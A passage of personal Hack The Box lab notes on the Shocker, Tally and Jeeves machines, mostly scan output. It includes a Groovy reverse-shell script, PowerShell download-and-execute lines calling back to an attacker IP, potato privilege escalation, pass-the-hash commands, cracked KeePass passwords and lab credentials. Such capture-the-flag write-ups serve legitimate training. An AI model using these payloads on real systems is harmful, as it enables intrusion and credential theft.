/>80/tcp    open  http    lighttpd 1.4.35<br />1583/tcp  open  upnp    Platinum UPnP 1.0.5.13 (UPnP/1.0 DLNADOC/1.50)<br />32400/tcp open  http    Plex Media Server httpd<br />32469/tcp open  upnp    Platinum UPnP 1.0.5.13 (UPnP/1.0 DLNADOC/1.50)<br />Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 179.72 seconds<br /><br />VERSIONS FILE 1563747187,,,<br /><br />root@kali:~/Desktop/Machines/HTB/Mirai# davtest -url <a href="http://10.10.10.48:80">http://10.10.10.48:80</a><br />********************************************************<br /> Testing DAV connection<br />OPEN		FAIL:	<a href="http://10.10.10.48:80">http://10.10.10.48:80	The</a> URL &quot;<a href="http://10.10.10.48:80/"">http://10.10.10.48:80/&quot;</a> is not DAV enabled or not accessible.<br />root@kali:~/Desktop/Machines/HTB/Mirai# nikto -host <a href="http://10.10.10.48">http://10.10.10.48</a><br />- Nikto v2.1.6<br />---------------------------------------------------------------------------<br />+ Target IP:          10.10.10.48<br />+ Target Hostname:    10.10.10.48<br />+ Target Port:        80<br />+ Start Time:         2019-07-21 18:13:33 (GMT-4)<br />---------------------------------------------------------------------------<br />+ Server: lighttpd/1.4.35<br />+ The anti-clickjacking X-Frame-Options header is not present.<br />+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br />+ Uncommon header &#39;x-pi-hole&#39; found, with contents: A black hole for Internet advertisements.<br />+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type<br />+ No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)<br />+ Allowed HTTP Methods: OPTIONS, GET, HEAD, POST <br />+ 7863 requests: 0 error(s) and 5 item(s) reported on remote host<br />+ End Time:           2019-07-21 18:48:26 (GMT-4) (2093 seconds)<br />---------------------------------------------------------------------------<br />root@kali:~/Desktop/Machines/HTB/Mirai# python3 /root/Desktop/Tools/dirsearch/dirsearch.py -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e php -f -t 20 -u <a href="http://10.10.10.48">http://10.10.10.48</a> <br /><br /> _|. _ _  _  _  _ _|_    v0.3.8<br />(_||| _) (/_(_|| (_| )<br /><br />Extensions: php | HTTP method: get | Threads: 20 | Wordlist size: 441041<br /><br />Error Log: /root/Desktop/Tools/dirsearch/logs/errors-19-07-21_18-13-02.log<br /><br />Target: <a href="http://10.10.10.48">http://10.10.10.48</a><br /><br />[18:13:02] Starting: <br />[18:14:07] 200 -   14KB - /admin/<br />[18:14:09] 200 -   13B  - /versions/<br /><br />Task Completed<br />lib/live/mount/persistence/sda2/root/root.txt<br /><br /></div><div class='page'><h1 class='title level-4'>10.10.10.56 Shocker</h1><br/>Nmap showed that 80 and 2222 (SSH) were open.<br />nikto, dirsearch, and web nmap did not show anything special.<br />a recursive dirsearch showed that in the /cgi-bin/ directory there was a file named “user.sh”<br />there was nothing special about this file.<br />after going through my possible web enumerations I tried shell shock and it worked!<br />user shell as sally<br />2ec24e11320026d1e70ff3e16695b233<br /><br />could not fix busted shell<br />curled over lse.sh and saw that I could sudo perl<br />/usr/bin/perl -e ‘exec “/bin/sh”;’          (found at gtfobins)<br />rooted<br />52c2715605d70c7619030560dc1ca467</div><div class='page'><h1 class='title level-5'>enumeration</h1><br/>nmap -sV -p 80 --script /Yeet/Tools/TireFire/http-shellshock.nse --script-args uri=/cgi-bin/user.sh,cmd=whoami 10.10.10.56</div><div class='page'><h1 class='title level-6'>nmap quick</h1><br/>echo -e e[5me[31me[1mttl=63e[0m; echo <a href="http://www.kellyodonnell.com/content/determining-os-type-ping;">http://www.kellyodonnell.com/content/determining-os-type-ping;</a> nmap 10.10.10.56<br />ttl=63<br /><a href="http://www.kellyodonnell.com/content/determining-os-type-ping">http://www.kellyodonnell.com/content/determining-os-type-ping</a><br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-03-31 09:57 EDT<br />Nmap scan report for 10.10.10.56<br />Host is up (0.12s latency).<br />Not shown: 998 closed ports<br />PORT     STATE SERVICE<br />80/tcp   open  http<br />2222/tcp open  EtherNetIP-1<br /><br />Nmap done: 1 IP address (1 host up) scanned in 13.86 seconds<br />squid@CoolHandKali:~$ <br /><br /></div><div class='page'><h1 class='title level-6'>nmap version</h1><br/>nmap -sC -sV 10.10.10.56<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-03-31 09:57 EDT<br />Nmap scan report for 10.10.10.56<br />Host is up (0.13s latency).<br />Not shown: 998 closed ports<br />PORT     STATE SERVICE VERSION<br />80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))<br />|_http-server-header: Apache/2.4.18 (Ubuntu)<br />|_http-title: Site doesn&#39;t have a title (text/html).<br />2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)<br />| ssh-hostkey: <br />|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)<br />|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)<br />|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)<br />Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 28.95 seconds<br /></div><div class='page'><h1 class='title level-6'>nmap all ports version</h1><br/>nmap -sC -sV -p- 10.10.10.56<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-03-31 10:00 EDT<br />Nmap scan report for 10.10.10.56<br />Host is up (0.13s latency).<br />Not shown: 65533 closed ports<br />PORT     STATE SERVICE VERSION<br />80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))<br />|_http-server-header: Apache/2.4.18 (Ubuntu)<br />|_http-title: Site doesn&#39;t have a title (text/html).<br />2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)<br />| ssh-hostkey: <br />|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)<br />|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)<br />|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)<br />Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 886.53 seconds<br />squid@CoolHandKali:~$ <br /></div><div class='page'><h1 class='title level-6'>80</h1><br/></div><div class='page'><h1 class='title level-7'>nmap web</h1><br/>PORT   STATE SERVICE REASON  VERSION<br />80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))<br />|_http-server-header: Apache/2.4.18 (Ubuntu)<br /><br /></div><div class='page'><h1 class='title level-7'>Nikto</h1><br/>nikto -host <a href="http://10.10.10.56:80">http://10.10.10.56:80</a> | tee nikto_10.10.10.56:80<br />- Nikto v2.1.6<br />---------------------------------------------------------------------------<br />+ Target IP:          10.10.10.56<br />+ Target Hostname:    10.10.10.56<br />+ Target Port:        80<br />+ Start Time:         2020-03-31 10:00:52 (GMT-4)<br />---------------------------------------------------------------------------<br />+ Server: Apache/2.4.18 (Ubuntu)<br />+ The anti-clickjacking X-Frame-Options header is not present.<br />+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br />+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type<br />+ Server may leak inodes via ETags, header found with file /, inode: 89, size: 559ccac257884, mtime: gzip<br />+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.<br />+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS <br />+ OSVDB-3233: /icons/README: Apache default file found.<br />+ 8673 requests: 0 error(s) and 7 item(s) reported on remote host<br />+ End Time:           2020-03-31 10:21:18 (GMT-4) (1226 seconds)<br />---------------------------------------------------------------------------<br />+ 1 host(s) tested<br />squid@CoolHandKali:~$ <br /><br /></div><div class='page'><h1 class='title level-7'>user.sh</h1><br/>HTTP/1.1 200 OK<br />Date: Tue, 31 Mar 2020 15:32:04 GMT<br />Server: Apache/2.4.18 (Ubuntu)<br />Connection: close<br />Content-Type: text/x-sh<br />Content-Length: 118<br /><br />Content-Type: text/plain<br /><br />Just an uptime test script<br /><br /> 11:32:04 up  1:35,  0 users,  load average: 0.11, 0.03, 0.01<br /><br /></div><div class='page'><h1 class='title level-7'>dirsearch</h1><br/>squid@CoolHandKali:~$ python3 /Yeet/Tools/dirsearch/dirsearch.py -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -e php,exe,sh,py,html,pl -f -t 20 -u <a href="http://10.10.10.56:80">http://10.10.10.56:80</a> -r -R 10 <br /><br /> _|. _ _  _  _  _ _|_    v0.3.9<br />(_||| _) (/_(_|| (_| )<br /><br />Extensions: php, exe, sh, py, html, pl | HTTP method: get | Threads: 20 | Wordlist size: 613521 | Recursion level: 10<br /><br />Error Log: /Yeet/Tools/dirsearch/logs/errors-20-03-31_11-10-24.log<br /><br />Target: <a href="http://10.10.10.56:80">http://10.10.10.56:80</a><br /><br />[11:10:25] Starting: <br />[11:10:26] 200 -  137B  - /index.html<br />[11:10:26] 403 -  291B  - /.html<br />[11:10:27] 403 -  294B  - /cgi-bin/<br />[11:10:30] 403 -  292B  - /icons/<br />17.83% - Last request to: 2666.exe<br />[12:26:57] Starting: cgi-bin/<br />[12:26:58] 403 -  299B  - /cgi-bin/.html<br />[12:27:04] 200 -  118B  - /cgi-bin/user.sh<br />CTRL+C detected: Pausing threads, please wait...<br /><br />Canceled by the user<br /></div><div class='page'><h1 class='title level-5'>flags</h1><br/>user<br />2ec24e11320026d1e70ff3e16695b233<br />root<br />52c2715605d70c7619030560dc1ca467</div><div class='page'><h1 class='title level-4'>10.10.10.59 Tally</h1><br/>Nmap showed that 21, 80, 1433 (sql) and smb ports were open as well as others<br />Long nmap showed me that the target was running sharepoint and the default page <a href="http://10.10.10.59/_layouts/15/start.aspx">http://10.10.10.59/_layouts/15/start.aspx</a><br />Sharepoints usual main content page is wiewlsts.aspx<br /><a href="http://10.10.10.59/_layouts/15/viewlsts.aspx">http://10.10.10.59/_layouts/15/viewlsts.aspx</a> shows me some good shit!<br />I am able to get a possible ftp password UTDRSCH53c&quot;$6hys and possible user ftp_user<br /><br />from here I&#39;ve got lots of files and dirs!<br />wget --mirror &#39;ftp://ftp_user:UTDRSCH53c&quot;$6hys@10.10.10.59&#39; to get all the shizzz<br /><br />in going through it I found that /user/tim/files has a kdbx file! (keepass)<br /><br />send the kdbx file to keepass2john to get the hash<br />send the hash to hashcat on my local windows box...<br />got a password!!! simplementeyo<br />I use keepassx to open the kdbx file and I get creds to the finance smb! U finance P Acc0unting<br />smbmap shows me that the smb&#39;s name is ACCT<br />I use my new mount skills to mount the smb drive!!<br /><br />More files and dirs!!<br />in the zz_Migration/binaries/New\ folder dir there is a custom .exe named tester<br />after running strings on tester.exe I was able to find..<br />    DRIVER={SQL Server};SERVER=TALLY, 1433;DATABASE=orcharddb;UID=sa;PWD=GWE3V65#6KFH93@4GWTG2G<br />    <br />Now lets use these new creds to log into the sql server!<br />    sqsh -S 10.10.10.59 -U sa -P GWE3V65#6KFH93@4GWTG2G<br />    we are in!!<br />go through the proper steps to turn on xp_cmdshell<br />and we&#39;ve got command execution<br />type user.txt <br /><br />whoami /priv showed that the SeImpersonatePrivilege token is owned<br />lets do rotten potato!!!!!<br /><br /><br /><a href="https://github.com/decoder-it/lonelypotato">https://github.com/decoder-it/lonelypotato</a>  has a compiled version of the exploit<br /><a href="https://www.puckiestyle.nl/htb-bounty/">https://www.puckiestyle.nl/htb-bounty/</a>        has a great rightup on the use of lonely potato (even though they call it rotten potato)<br /><br />1.<br />make a file named rev.bat with the contents<br />    powershell.exe -c &quot;iex(new-object net.webclient).downloadstring(&#39;<a href="http://10.10.14.60:8000/ye32.ps1')"">http://10.10.14.60:8000/Invoke-PowerShellTcp.ps1&#39;)&quot;</a><br />2.<br />add a line to the bottom of Invoke-PowerShellTcp.ps1<br />    Invoke-PowershellTcp -Reverse -IPAddress 10.10.14.60 -port 3232<br />3.<br />pull lonely potato and rev.bat to the target<br />    powershell.exe -exec Bypass &quot;IEX (New-Object Net.WebClient).Downloadfile(&#39;<a href="http://10.10.14.60:8000/rev.bat',">http://10.10.14.60:8000/rev.bat&#39;,</a> &#39;C:\users\kohsuke\appdata\local\temp\rev.bat&#39;)&quot;<br />4.<br />start nc listener<br />    nc -nlvp 3232<br />5.<br />execute the lonely potato exploit (renamed to rp.exe)<br />    C:\users\kohsuke\appdata\local\temp\rp.exe * C:\users\kohsuke\appdata\local\temp\rev.bat<br />6.<br />    enjoy your system shell!<br />    <br />    <br />    #rooted</div><div class='page'><h1 class='title level-5'>enumeration</h1><br/>ftp_user<br />UTDRSCH53c&quot;$6hys<br /><br /><br /><br /><br />simplementeyo<br /><br />Acc0unting<br /><br />DRIVER={SQL Server};SERVER=TALLY, 1433;DATABASE=orcharddb;UID=sa;PWD=GWE3V65#6KFH93@4GWTG2G;</div><div class='page'><h1 class='title level-6'>nmap</h1><br/>echo -e e[5me[31me[1mttl=127e[0m; echo <a href="http://www.kellyodonnell.com/content/determining-os-type-ping;">http://www.kellyodonnell.com/content/determining-os-type-ping;</a> nmap 10.10.10.59<br />ttl=127<br /><a href="http://www.kellyodonnell.com/content/determining-os-type-ping">http://www.kellyodonnell.com/content/determining-os-type-ping</a><br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-12-19 11:57 EST<br />Nmap scan report for 10.10.10.59<br />Host is up (0.22s latency).<br />Not shown: 992 closed ports<br />PORT     STATE SERVICE<br />21/tcp   open  ftp<br />80/tcp   open  http<br />81/tcp   open  hosts2-ns<br />135/tcp  open  msrpc<br />139/tcp  open  netbios-ssn<br />445/tcp  open  microsoft-ds<br />808/tcp  open  ccproxy-http<br />1433/tcp open  ms-sql-s<br /><br />Nmap done: 1 IP address (1 host up) scanned in 27.23 seconds<br /><br /><br /><br />PORT   STATE SERVICE REASON          VERSION<br />80/tcp open  http    syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)<br />Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows<br /></div><div class='page'><h1 class='title level-6'>nmap long</h1><br/></div><div class='page'><h1 class='title level-6'>ftp</h1><br/>FTP details<br /><br />hostname: tally<br /><br />workgroup: htb.local<br /><br />password: UTDRSCH53c&quot;$6hys<br /><br />Please create your own user folder upon logging in</div><div class='page'><h1 class='title level-6'>userlist</h1><br/>09-13-17  07:59PM       &lt;DIR&gt;          Administrator<br />09-15-17  07:59PM       &lt;DIR&gt;          Ekta<br />09-11-17  09:20PM       &lt;DIR&gt;          Jess<br />09-15-17  07:59PM       &lt;DIR&gt;          Paul<br />09-15-17  07:56PM       &lt;DIR&gt;          Rahul<br />09-20-17  11:38PM       &lt;DIR&gt;          Sarah<br />09-17-17  08:43PM       &lt;DIR&gt;          Stuart<br />09-15-17  07:57PM       &lt;DIR&gt;          Tim<br />09-15-17  07:58PM       &lt;DIR&gt;          Yenwi<br /></div><div class='page'><h1 class='title level-6'>hashcat</h1><br/>C:\Users\Squid\Desktop\BruteForce\hashcat-5.1.0&gt;hashcat64.exe -m 13400 yeet\timmy.txt yeet\rockyou.txt<br />hashcat (v5.1.0) starting...<br /><br />* Device #1: WARNING! Kernel exec timeout is not disabled.<br />             This may cause &quot;CL_OUT_OF_RESOURCES&quot; or related errors.<br />             To disable the timeout, see: <a href="https://hashcat.net/q/timeoutpatch">https://hashcat.net/q/timeoutpatch</a><br />* Device #2: Intel&#39;s OpenCL runtime (GPU only) is currently broken.<br />             We are waiting for updated OpenCL drivers from Intel.<br />             You can use --force to override, but do not report related errors.<br />nvmlDeviceGetFanSpeed(): Not Supported<br /><br />OpenCL Platform #1: NVIDIA Corporation<br />======================================<br />* Device #1: Quadro P3200, 1536/6144 MB allocatable, 14MCU<br /><br />OpenCL Platform #2: Intel(R) Corporation<br />========================================<br />* Device #2: Intel(R) UHD Graphics P630, skipped.<br />* Device #3: Intel(R) Xeon(R) E-2176M  CPU @ 2.70GHz, skipped.<br /><br />Hashes: 1 digests; 1 unique digests, 1 unique salts<br />Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates<br />Rules: 1<br /><br />Applicable optimizers:<br />* Zero-Byte<br />* Single-Hash<br />* Single-Salt<br /><br />Minimum password length supported by kernel: 0<br />Maximum password length supported by kernel: 256<br /><br />Watchdog: Temperature abort trigger set to 90c<br /><br />Dictionary cache hit:<br />* Filename..: yeet\rockyou.txt<br />* Passwords.: 14344384<br />* Bytes.....: 139921497<br />* Keyspace..: 14344384<br /><br />$keepass$*2*6000*222*f362b5565b916422607711b54e8d0bd20838f5111d33a5eed137f9d66a375efb*3f51c5ac43ad11e0096d59bb82a59dd09cfd8d2791cadbdb85ed3020d14c8fea*3f759d7011f43b30679a5ac650991caa*b45da6b5b0115c5a7fb688f8179a19a749338510dfe90aa5c2cb7ed37f992192*535a85ef5c9da14611ab1c1edc4f00a045840152975a4d277b3b5c4edc1cd7da:simplementeyo<br /><br />Session..........: hashcat<br />Status...........: Cracked<br />Hash.Type........: KeePass 1 (AES/Twofish) and KeePass 2 (AES)<br />Hash.Target......: $keepass$*2*6000*222*f362b5565b916422607711b54e8d0b...1cd7da<br />Time.Started.....: Thu Dec 19 13:21:44 2019 (1 sec)<br />Time.Estimated...: Thu Dec 19 13:21:45 2019 (0 secs)<br />Guess.Base.......: File (yeet\rockyou.txt)<br />Guess.Queue......: 1/1 (100.00%)<br />Speed.#1.........:    70482 H/s (8.49ms) @ Accel:128 Loops:64 Thr:32 Vec:1<br />Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts<br />Progress.........: 57344/14344384 (0.40%)<br />Rejected.........: 0/57344 (0.00%)<br />Restore.Point....: 0/14344384 (0.00%)<br />Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:5952-6000<br />Candidates.#1....: 123456 -&gt; XIOMARA<br />Hardware.Mon.#1..: Temp: 49c Util: 99% Core:1582MHz Mem:3510MHz Bus:16<br /><br />Started: Thu Dec 19 13:21:38 2019<br />Stopped: Thu Dec 19 13:21:45 2019<br /><br />C:\Users\Squid\Desktop\BruteForce\hashcat-5.1.0&gt;</div><div class='page'><h1 class='title level-5'>Flags</h1><br/>user<br />    be72362e8dffeca2b42406d5d1c74bb1<br />root<br />    608bb707348105911c8991108e523eda</div><div class='page'><h1 class='title level-4'>10.10.10.63 Jeeves</h1><br/>nmap showed me that 80, 135, 445, 50000 were all open.<br />80 was an up to date IIS server that would send you to a <em>picture</em> of an error page whenever data was entered (rabithole)<br />smb scans of 135 asd 445 gave me nothing<br />50000 was a webserver<br />dirsearch showed me that /askjeeves/ was an available directory (the only one)<br />I could see that I am running jenkins 2.87, (not vulnerale courtesy of my research)<br />Anonnymous login was enabled, so I was able to see “manage jenkins” by default<br />manage jenkins &gt; script console &gt; do the thing!!<br /><br />cmd	= &quot;net user&quot;<br />println(cmd.execute().text)<br />^^we can see that this is running as koehoe (or some shit)<br /><br /><br />String host=&quot;10.10.14.60&quot;;<br />int port=3232;<br />String cmd=&quot;cmd.exe&quot;;<br />Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();<br />^^calls back to our nc listener and gives us a shell<br /><a href="https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76">https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76</a><br />^^respect<br /><br />going to koehoe desktop gives us the user flag<br />koehoe documents shows us a kdbx file!!!!!! (CEH.kdbx) kdbx is a keepass file! if you can get in, it stores creds!!<br /><br />first we have got to get it on the kali...<br />on the kali<br />    smbserver.py yeet `pwd`<br />on the target<br />    net use x: \\10.10.14.60\yeet<br />    x:<br />now you can copy things between machines<br /><br />use keepass2john to get a hash of keepass to crack later<br />    keepass2john CEH.kdbx &gt; keepasshash.txt<br />    #make sure to drop the CEH: part<br />CEH:$keepass$*2*6000*222*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48<br /><br />go to <a href="https://hashcat.net/wiki/doku.php?id=example_hashes">https://hashcat.net/wiki/doku.php?id=example_hashes</a> to look up example hashes and find the right number (13400 in this case)<br />on host windows machine C:\Users\Squid\Desktop\BruteForce\hashcat-5.1.0&gt;hashcat64.exe -m 13400 yeet\jeeves.txt yeet\rockyou.txt<br />###note### You may have to delete a space from the end of *jeeves.txt*<br />hashcat gives the responce moonshine1<br /><br />now we can open the keepass file!!!<br />useing kali&#39;s keepass2 (or other times keepassx) we can now see the for things!!<br />most helpfully<br />dc recovery         S1TjAtJHKsugh9oC4VZl<br />backup stuff        aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00<br /><br />winexe -U jenkins/administrator%S1TjAtJHKsugh9oC4VZl //10.10.10.63 cmd.exe<br />pth-winexe -U jenkins/administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 //10.10.10.63 cmd.exe<br /><br />We&#39;ve got a shell!!!!<br /> <br /> <br />Now we need to do some ADS stuff to read root.txt<br />dir -r<br />    hm.txt:root.txt:$DATA<br /><br />powershell (get-content hm.txt -stream root.txt)<br />    afbc5bd4b615a60648cec41c6ac92530<br /><br /><br />YEE-HAW<br /><br /><br /><br /><br /><br /><br /><br /><br /></div><div class='page'><h1 class='title level-5'>enumeration</h1><br/>moonshine1<br /><br />hashcat64.exe -m 13400 hashes\jeeves.txt hashes\rockyou.txt<br /><br /><br />cmd = &quot;&quot;&quot; powershell &quot;IEX(New-Object Net.WebClient).downloadString(&#39;<a href="http://10.10.14.60:8000/ye.ps1')"">http://10.10.14.60:8000/ye.ps1&#39;)&quot;</a> &quot;&quot;&quot;<br />println cmd.execute().text<br /><br /><br /><br /><br /><br /><br /><a href="https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md">https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md</a><br /><br /><a href="https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/">https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/</a> &lt;&lt;&lt;&lt;&lt;<br /><br /><a href="https://decoder.cloud/2017/12/23/the-lonely-potato/">https://decoder.cloud/2017/12/23/the-lonely-potato/</a></div><div class='page'><h1 class='title level-6'>nmap</h1><br/>nmap -sC -sV -p- 10.10.10.63<br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-12-18 10:02 EST<br />Nmap scan report for 10.10.10.63<br />Host is up (0.093s latency).<br />Not shown: 65531 filtered ports<br />PORT      STATE SERVICE      VERSION<br />80/tcp    open  http         Microsoft IIS httpd 10.0<br />| http-methods: <br />|_  Potentially risky methods: TRACE<br />|_http-server-header: Microsoft-IIS/10.0<br />|_http-title: Ask Jeeves<br />135/tcp   open  msrpc        Microsoft Windows RPC<br />445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)<br />50000/tcp open  http         Jetty 9.4.z-SNAPSHOT<br />|_http-server-header: Jetty(9.4.z-SNAPSHOT)<br />|_http-title: Error 404 Not Found<br />Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows<br /><br />Host script results:<br />|_clock-skew: mean: 5h00m22s, deviation: 0s, median: 5h00m22s<br />| smb-security-mode: <br />|   account_used: guest<br />|   authentication_level: user<br />|   challenge_response: supported<br />|_  message_signing: disabled (dangerous, but default)<br />| smb2-security-mode: <br />|   2.02: <br />|_    Message signing enabled but not required<br />| smb2-time: <br />|   date: 2019-12-18 15:07:17<br />|_  start_date: 2019-12-18 15:02:44<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 342.91 seconds<br /></div><div class='page'><h1 class='title level-6'>users</h1><br/>jeeves\kohsuke</div><div class='page'><h1 class='title level-6'>nikto</h1><br/>nikto -host <a href="http://10.10.10.63:80">http://10.10.10.63:80</a> | tee nikto_10.10.10.63:80<br />- Nikto v2.1.6<br />---------------------------------------------------------------------------<br />+ Target IP:          10.10.10.63<br />+ Target Hostname:    10.10.10.63<br />+ Target Port:        80<br />+ Start Time:         2019-12-18 09:27:23 (GMT-5)<br />---------------------------------------------------------------------------<br />+ Server: Microsoft-IIS/10.0<br />+ The anti-clickjacking X-Frame-Options header is not present.<br />+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br />+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type<br />+ No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)<br />+ Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST <br />+ Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST <br />+ 7499 requests: 0 error(s) and 5 item(s) reported on remote host<br />+ End Time:           2019-12-18 09:40:25 (GMT-5) (782 seconds)<br />---------------------------------------------------------------------------<br />+ 1 host(s) tested<br />root@kali:~/Desktop/Machines/HTB/Jeeves# <br /></div><div class='page'><h1 class='title level-6'>groovy</h1><br/>cmd	= &quot;net user&quot;<br />println(cmd.execute().text)<br /><br /><br /><br />String host=&quot;10.10.14.60&quot;;<br />int port=3232;<br />String cmd=&quot;cmd.exe&quot;;<br />Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();<br /><br /><br />https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76</div><div class='page'><h1 class='title level-6'>PowerUp -master</h1><br/>PS C:\Users\kohsuke\desktop&gt; IEX(New-Object Net.WebClient).downloadString(&#39;<a href="http://10.10.14.60:8000/PowerUp.ps1')">http://10.10.14.60:8000/PowerUp.ps1&#39;)</a><br /><br />[*] Running Invoke-AllChecks<br /><br /><br />[*] Checking if user is in a local group with administrative privileges...<br /><br /><br />[*] Checking for unquoted service paths...<br /><br /><br />[*] Checking service executable and argument permissions...<br /><br /><br />ServiceName                     : jenkins<br />Path                            : &quot;C:\Users\Administrator\.jenkins\jenkins.exe&quot;<br />ModifiableFile                  : C:\Users\Administrator\.jenkins\jenkins.exe<br />ModifiableFilePermissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}<br />ModifiableFileIdentityReference : JEEVES\kohsuke<br />StartName                       : .\kohsuke<br />AbuseFunction                   : Install-ServiceBinary -Name &#39;jenkins&#39;<br />CanRestart                      : False<br /><br /><br /><br /><br /><br />[*] Checking service permissions...<br /><br /><br />[*] Checking %PATH% for potentially hijackable DLL locations...<br /><br /><br />[*] Checking for AlwaysInstallElevated registry key...<br /><br /><br />[*] Checking for Autologon credentials in registry...<br /><br /><br />[*] Checking for modifidable registry autoruns and configs...<br /><br /><br />[*] Checking for modifiable schtask files/configs...<br /><br /><br />[*] Checking for unattended install files...<br /><br /><br />UnattendPath : C:\Windows\Panther\Unattend.xml<br /><br /><br /><br /><br /><br />[*] Checking for encrypted web.config strings...<br /><br /><br />[*] Checking for encrypted application pool and virtual directory passwords...<br /><br /><br />[*] Checking for plaintext passwords in McAfee SiteList.xml files....<br /><br /><br /><br /><br />[*] Checking for cached Group Policy Preferences .xml files....<br /><br /><br />PS C:\Users\kohsuke\desktop&gt; Get-ChildItem : Access to the path &#39;C:\ProgramData\VMware\VMware Tools\GuestProxyData\trusted&#39; is denied.<br />At line:3704 char:21<br />+ ... $XMlFiles = Get-ChildItem -Path $AllUsers -Recurse -Include &#39;Groups.x ...<br />+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~<br />    + CategoryInfo          : PermissionDenied: (C:\ProgramData\...oxyData\trusted:String) [Get-ChildItem], Unauthoriz <br />   edAccessException<br />    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand<br /> <br /><br /></div><div 